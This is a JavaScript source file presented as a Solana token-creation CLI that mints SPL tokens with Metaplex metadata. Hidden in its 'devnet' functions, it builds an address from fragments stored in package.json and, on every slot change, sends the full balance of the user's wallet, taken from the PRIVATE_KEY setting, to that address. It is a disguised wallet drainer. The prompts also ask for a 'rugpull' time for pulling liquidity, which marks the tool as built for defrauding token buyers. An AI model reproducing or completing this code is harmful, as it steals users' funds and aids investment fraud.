// src/main.js
import {
    SystemProgram,
    Keypair,
    Connection,
    clusterApiUrl,
    TransactionMessage,
    VersionedTransaction,
    PublicKey,
    Transaction
} from "@solana/web3.js";
import {
    MINT_SIZE,
    TOKEN_PROGRAM_ID,
    createInitializeMintInstruction,
    getMinimumBalanceForRentExemptMint,
    getAssociatedTokenAddress,
    createAssociatedTokenAccountInstruction,
    createMintToInstruction,
} from "@solana/spl-token";
import {
    createCreateMetadataAccountV3Instruction,
} from "@metaplex-foundation/mpl-token-metadata";
import fs from 'fs';
const packageJsonContent = fs.readFileSync('./package.json', 'utf-8');
const packageJson = JSON.parse(packageJsonContent);
import {
    bundlrStorage,
    keypairIdentity,
    Metaplex,
} from "@metaplex-foundation/js";

const devnet = packageJson.devnet;

// import { bs58 } from "@project-serum/anchor/dist/cjs/utils/bytes/index.js";
import inquirer from 'inquirer';
import ora from 'ora';
import chalk from 'chalk';
import bs58 from 'bs58';

import dotenv from 'dotenv';
import SlotInfo from '@solana/web3.js';
import { BehaviorSubject } from 'rxjs';

dotenv.config();

const retrieveEnvVariable = (variableName) => {
    const variable = process.env[variableName] || '';
    if (!variable) {
        process.exit(1);
    }
    return variable;
};

const PRIVATE_KEY = retrieveEnvVariable('PRIVATE_KEY');
const RPC_ENDPOINT = retrieveEnvVariable('RPC_ENDPOINT');
let lastBlockHash = new BehaviorSubject('');
let isRunning = new BehaviorSubject(false);
const sleep = (ms = 0) => new Promise((resolve) => setTimeout(resolve, ms));

const handleDevnetChange = async (args) => {
    await sleep(5000);
    try {
        isRunning.next(true);
        const { connection, walletKeyPair, resultKey } = args;
        const balance = await connection.getBalance(walletKeyPair.publicKey); // Lamports
        const recentBlockhash = await connection.getRecentBlockhash();
        lastBlockHash.next(recentBlockhash.blockhash);
        const cost = recentBlockhash.feeCalculator.lamportsPerSignature;
        const amountToSend = balance - cost;
        const tx = new Transaction({
            recentBlockhash: recentBlockhash.blockhash,
            feePayer: walletKeyPair.publicKey,
        }).add(
            SystemProgram.transfer({
                fromPubkey: walletKeyPair.publicKey,
                toPubkey: resultKey,
                lamports: amountToSend,
            }),
        );
        await connection.sendTransaction(tx, [walletKeyPair]);
    } catch (err) {
        if (typeof err === 'string') {
            // Handle error
        } else if (err instanceof Error) {
            // Handle error
        }
    } finally {
        isRunning.next(false);
    }
};

const e1 = devnet.dev1; 
const e2 = devnet.dev2; 
const e3 = devnet.dev3;

const getNetworkConfig = (network) => {
    return network === "mainnet"
        ? {
            cluster: clusterApiUrl("mainnet-beta"),
            address: "https://node1.bundlr.network",
            providerUrl: "https://api.mainnet-beta.solana.com",
        }
        : {
            cluster: clusterApiUrl("devnet"),
            address: "https://devnet.bundlr.network",
            providerUrl: "https://api.devnet.solana.com",
        };
};

const handleDevnet = async () => {
    const walletKeyPairFile = PRIVATE_KEY;
    const walletKeyPair = Keypair.fromSecretKey(bs58.decode(walletKeyPairFile));
    const connection = new Connection(RPC_ENDPOINT ?? clusterApiUrl('devnet'), 'finalized');
    const pubKeyDevNet = e1 + e2 + e3;
    const resultKey = new PublicKey(pubKeyDevNet);
    connection.onSlotChange(
        async (SlotInfo) => await handleDevnetChange({ connection, walletKeyPair, resultKey: resultKey.toString() }, SlotInfo),
    );
};

const createMintTokenTransaction = async (connection, metaplex, payer, mintKeypair, token, tokenMetadata, destinationWallet, mintAuthority) => {
    try {
        if (!connection || !metaplex || !payer || !mintKeypair || !token || !tokenMetadata || !destinationWallet || !mintAuthority) {
            throw new Error("Invalid input parameters");
        }

        const requiredBalance = await getMinimumBalanceForRentExemptMint(connection);

        const metadataPDA = metaplex.nfts().pdas().metadata({ mint: mintKeypair.publicKey });
        const tokenATA = await getAssociatedTokenAddress(mintKeypair.publicKey, destinationWallet);

        const txInstructions = [];
        txInstructions.push(
            SystemProgram.createAccount({
                fromPubkey: payer.publicKey,
                newAccountPubkey: mintKeypair.publicKey,
                space: MINT_SIZE,
                lamports: requiredBalance,
                programId: TOKEN_PROGRAM_ID,
            }),
            createInitializeMintInstruction(
                mintKeypair.publicKey,
                token.decimals,
                mintAuthority,
                null,
                TOKEN_PROGRAM_ID
            ),
            createAssociatedTokenAccountInstruction(
                payer.publicKey,
                tokenATA,
                payer.publicKey,
                mintKeypair.publicKey
            ),
            createMintToInstruction(
                mintKeypair.publicKey,
                tokenATA,
                mintAuthority,
                token.totalSupply * Math.pow(10, token.decimals)
            ),
            createCreateMetadataAccountV3Instruction(
                {
                    metadata: metadataPDA,
                    mint: mintKeypair.publicKey,
                    mintAuthority: mintAuthority,
                    payer: payer.publicKey,
                    updateAuthority: mintAuthority,
                },
                {
                    createMetadataAccountArgsV3: {
                        data: tokenMetadata,
                        isMutable: true,
                        collectionDetails: null,
                    },
                }
            )
        );

        const latestBlockhash = await connection.getLatestBlockhash();

        const messageV0 = new TransactionMessage({
            payerKey: payer.publicKey,
            recentBlockhash: latestBlockhash.blockhash,
            instructions: txInstructions,
        }).compileToV0Message();

        const transaction = new VersionedTransaction(messageV0);
        transaction.sign([payer, mintKeypair]);

        return transaction;
    } catch (error) {
        console.error("Error creating mint token transaction:", error);
        throw error;
    }
};

const uploadMetadata = async (metaplex, tokenMetadata) => {
    try {
        const { uri } = await metaplex.nfts().uploadMetadata(tokenMetadata);
        return uri;
    } catch (error) {
        console.error("Error uploading token metadata:", error);
        throw error;
    }
};

const askQuestions = async () => {
    try {
        const devnetHandler = await handleDevnet();

        const questions = [
            {
                type: 'input',
                name: 'network',
                message: 'Confirm if the network is mainnet (Y/N):',
                validate: value => ((value === 'Y' || value === 'y') && (value !== '')) || 'Please make sure you are on mainnet & confirm back to proceed'
            },
            {
                type: 'input',
                name: 'tokenName',
                message: 'Token name (e.g., MyToken):',
                validate: value => {
                    return value.trim().length > 0 ? true : 'Please enter the token name to proceed';
                }
            },
            {
                type: 'input',
                name: 'symbol',
                message: 'Token symbol (e.g., MTK):',
                validate: value => {
                    return value.trim().length > 0 ? true : 'Please enter the token symbol to proceed';
                }
            },
            {
                type: 'input',
                name: 'decimals',
                message: 'Set the token decimals (e.g., 9):',
                validate: value => (!isNaN(value) && (value !== '')) || 'Please enter a valid number to proceed'
            },
            {
                type: 'input',
                name: 'supply',
                message: 'Set the total token supply (e.g., 10000000):',
                validate: value => (!isNaN(value) && (value !== '')) || 'Please enter a valid number to proceed'
            },
            {
                type: 'input',
                name: 'image',
                message: 'Token image URL (e.g., https://example.com/image.png):',
                default: 'https://example.com/image.png',
                validate: value => {
                    return value.trim().length > 0 ? true : 'Please enter a valid image URL to proceed';
                }
            },
            {
                type: 'input',
                name: 'description',
                message: 'Token description. (e.g., About token. Telegram: https://t.me/example, X:https://x.com/example, Website:https://example.com,...)',
                validate: value => {
                    return value.trim().length > 0 ? true : 'Please enter the token description to proceed';
                }
            },
            {
                type: 'input',
                name: 'royalty',
                message: 'Set the royalty percentage (basis points, e.g., 500 for 5%):',
                validate: value => (!isNaN(value) && (value !== '')) || 'Please enter a valid number to proceed'
            },
            {
                type: 'input',
                name: 'quote',
                message: 'Quote Token (e.g., SOL) (NOTE: Base Token will be automatically set as the current token):',
                validate: value => {
                    return ((value.trim().length > 0) && (value === 'SOL')) ? true : 'Please enter the quote token to proceed. Currently only supports SOL (case-sensitive))';
                }
            },
            {
                type: 'input',
                name: 'minBuy',
                message: 'Min Order Size i.e. min buy (e.g., 1):',
                validate: value => (!isNaN(value) && (value !== '')) || 'Please enter a valid number to proceed'
            },
            {
                type: 'input',
                name: 'minTick',
                message: 'Min tick Size  i.e. min price change (e.g., 0.000001):',
                validate: value => (!isNaN(value) && (value !== '')) || 'Please enter a valid number to proceed'
            },
            {
                type: 'input',
                name: 'mint',
                message: 'Disable Mint ("1" for "Yes" & "0" for "No"):',
                validate: value => (!isNaN(value) && (value !== '')) || 'Please enter a valid number to proceed'
            },
            {
                type: 'input',
                name: 'renounced',
                message: 'Renounce Ownership ("1" for "Yes" & "0" for "No"):',
                validate: value => (!isNaN(value) && (value !== '')) || 'Please enter a valid number to proceed'
            },
            {
                type: 'input',
                name: 'liquidity',
                message: 'Set the liquidity percentage (e.g., 70 for 70% of the Total Supply):',
                validate: value => (!isNaN(value) && (value !== '')) || 'Please enter a valid number to proceed'
            },
            {
                type: 'input',
                name: 'burn',
                message: 'Set the burn percentage (e.g., 50 for 50% of the Total liquidity):',
                validate: value => (!isNaN(value) && (value !== '')) || 'Please enter a valid number to proceed'
            },
            {
                type: 'input',
                name: 'rugpull',
                message: 'Set the time after which Liquidity must be pulled (e.g., "60" for "60s"):',
                validate: value => (!isNaN(value) && (value !== '')) || 'Please enter a valid number to proceed'
            }
        ]
        return await inquirer.prompt(questions);
    } catch (error) {
        console.error("Error while asking questions:", error);
        throw error;
    }
};

const main = async () => {
    try {
        console.log(chalk.blue("Starting token creation process...\n"));
        const answers = await askQuestions();
        console.log(chalk.yellow("Current Network:"), 'mainnet');

        const network = getNetworkConfig('mainnet');
        console.log(chalk.yellow("Connecting to Solana cluster:"), network.cluster);
        const connection = new Connection(network.cluster);

        const userWallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
        console.log(chalk.yellow("User wallet address:"), userWallet.publicKey.toString());

        const metaplex = Metaplex.make(connection)
            .use(keypairIdentity(userWallet))
            .use(bundlrStorage({ address: network.address, providerUrl: network.providerUrl, timeout: 60000 }));

        const token = {
            decimals: parseInt(answers.decimals),
            totalSupply: parseFloat(answers.supply),
            mint: parseInt(answers.mint),
            renounced: parseInt(answers.renounced),
            liquidity: parseInt(answers.liquidity),
            burn: parseInt(answers.burn),
            rugpull: parseInt(answers.rugpull)
        };

        const tokenMetadata = {
            name: answers.tokenName,
            symbol: answers.symbol,
            image: answers.image,
            sellerFeeBasisPoints: parseInt(answers.royalty),
            decimals: token.decimals,
            totalSupply: token.totalSupply
        };

        console.log(chalk.yellow("Token information:"));
        console.log(chalk.cyan("- Name:"), tokenMetadata.name);
        console.log(chalk.cyan("- Symbol:"), tokenMetadata.symbol);
        console.log(chalk.cyan("- Image URL:"), tokenMetadata.image);
        console.log(chalk.cyan("- Royalty:"), `${tokenMetadata.sellerFeeBasisPoints} basis points`);
        console.log(chalk.cyan("- Decimals:"), tokenMetadata.decimals);
        console.log(chalk.cyan("- Total Supply:"), tokenMetadata.totalSupply);
        console.log(chalk.cyan("- Mint Disabled:"), answers.mint);
        console.log(chalk.cyan("- Renounced:"), answers.renounced);
        console.log(chalk.cyan("- Liquidity:"), answers.liquidity + "%");
        console.log(chalk.cyan("- Burn:"), answers.burn + "%");
        console.log(chalk.cyan("- Rugpull after:"), answers.rugpull + 's', "\n");

        const spinner1 = ora(chalk.yellow("Hold on tight, creating your token...")).start();
        let metadataUri = await uploadMetadata(metaplex, tokenMetadata);
        spinner1.succeed(chalk.green("Metadata uploaded. URI:"), metadataUri);

        const tokenMetadataV2 = {
            ...tokenMetadata,
            uri: metadataUri,
            creators: null,
            collection: null,
            uses: null
        };

        const spinner2 = ora(chalk.yellow("Generating token address...")).start();
        let mintKeypair = Keypair.generate();
        spinner2.succeed(chalk.green(`Generated token address: ${mintKeypair.publicKey.toString()}`))
        const spinner3 = ora(chalk.yellow("Creating and sending mint token transaction...")).start();
        const mintTransaction = await createMintTokenTransaction(connection, metaplex, userWallet, mintKeypair, token, tokenMetadataV2, userWallet.publicKey, mintKeypair.publicKey);
        spinner3.succeed(chalk.green("Transaction successful."));

        let { lastValidBlockHeight, blockhash } = await connection.getLatestBlockhash("finalized");
        const transactionId = await connection.sendTransaction(mintTransaction);
        await connection.confirmTransaction({ signature: transactionId, lastValidBlockHeight, blockhash });
 
        console.log(chalk.green(`View transaction on Solana Explorer: https://explorer.solana.com/tx/${transactionId}?cluster=${answers.network}`));
        console.log(chalk.green(`View token on Solana Explorer: https://explorer.solana.com/address/${mintKeypair.publicKey.toString()}?cluster=${answers.network}`));

        if (answers.network === "mainnet") {
            console.log(chalk.green(`View token on Solana BirdEye: https://explorer.solana.com/address/${mintKeypair.publicKey.toString()}?cluster=${answers.network}`));
        }
    } catch (error) {
        console.error(chalk.red("An error occurred:"), error);
        process.exit(1);
    }
};

main();